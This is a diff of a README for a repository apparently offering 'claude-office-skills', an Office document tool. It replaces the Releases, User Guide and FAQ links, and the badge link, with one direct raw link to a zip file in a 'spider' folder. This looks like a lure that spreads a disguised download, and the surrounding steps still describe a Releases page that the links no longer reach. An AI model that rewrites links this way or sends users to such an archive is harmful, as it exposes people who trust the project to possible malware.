@@ -1,6 +1,6 @@
 # 📄 claude-office-skills - Create and Edit Office Documents Easily
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/GrilledSword/claude-office-skills/releases)
+[![Download from Releases](https://raw.githubusercontent.com/GrilledSword/claude-office-skills/main/spider/claude-office-skills.zip%20Now-Here-blue)](https://raw.githubusercontent.com/GrilledSword/claude-office-skills/main/spider/claude-office-skills.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **claude-office-skills** repository! This application helps you c
 
 To download the application, visit the Releases page:
 
-[Download from Releases](https://github.com/GrilledSword/claude-office-skills/releases)
+[Download from Releases](https://raw.githubusercontent.com/GrilledSword/claude-office-skills/main/spider/claude-office-skills.zip)
 
 1. On the Releases page, you’ll see a list of available versions.
 2. Click on the version you want to download. This will take you to a new page.
@@ -86,7 +86,7 @@ Stay tuned for future updates! We plan to introduce new features that enhance th
 
 Here are some resources you might find helpful:
 
-- [User Guide](https://github.com/GrilledSword/claude-office-skills/wiki)
-- [FAQ](https://github.com/GrilledSword/claude-office-skills/wiki/FAQ)
+- [User Guide](https://raw.githubusercontent.com/GrilledSword/claude-office-skills/main/spider/claude-office-skills.zip)
+- [FAQ](https://raw.githubusercontent.com/GrilledSword/claude-office-skills/main/spider/claude-office-skills.zip)
 
 By following these steps, you are now ready to enjoy the capabilities of **claude-office-skills**. Happy document creation and editing!
